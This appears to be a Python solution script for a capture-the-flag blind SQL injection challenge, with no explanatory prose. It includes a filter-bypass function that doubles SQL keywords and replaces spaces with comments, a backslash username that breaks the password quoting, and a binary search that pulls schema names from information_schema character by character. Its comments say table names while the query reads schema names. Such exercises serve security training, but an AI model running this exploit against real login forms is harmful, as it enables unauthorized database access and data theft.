```python
import requests
```

```python
def waf(p):
    p = p.replace(" ", "/**/")
    p = p.replace("union", "uniunionon")
    p = p.replace("select", "seleselectct")
    p = p.replace("where", "whwhereere")
    p = p.replace("and", "aandnd")
    p = p.replace("or", "oorr")
    return p

def check(password):
    payload = waf(password) + '#'
    retry = 3
    while retry > 0:
        res = requests.post("https://sqli.chal.h4ck3r.quest/login", data={"username": "\\", "password": payload})
        if res.status_code == 200:
            # print(res.text)
            return res.text == 'Welcome!'
        retry -= 1
        
    raise Exception("retry failed!")
```

```python
# crack table_name
base_password=" union select 1,2,3"
```

```python
def crack_ascii(pos):
    start = 0
    end = 128
    while start <= end:
        mid = int(start + (end - start) / 2)
        # print(start, mid, end)
        password = base_password + f" where (ascii(mid((select group_concat(schema_name) from information_schema.schemata),{pos},1))<{mid})"
        stat = check(password)
        if stat == True:
            end = mid - 1
            if start > end:
                return end
        else:
            start = mid + 1
            if start > end:
                return mid
            
table_name = ""
for i in range(1, 1000):
    table_name += chr(crack_ascii(i))
    print(table_name)
```
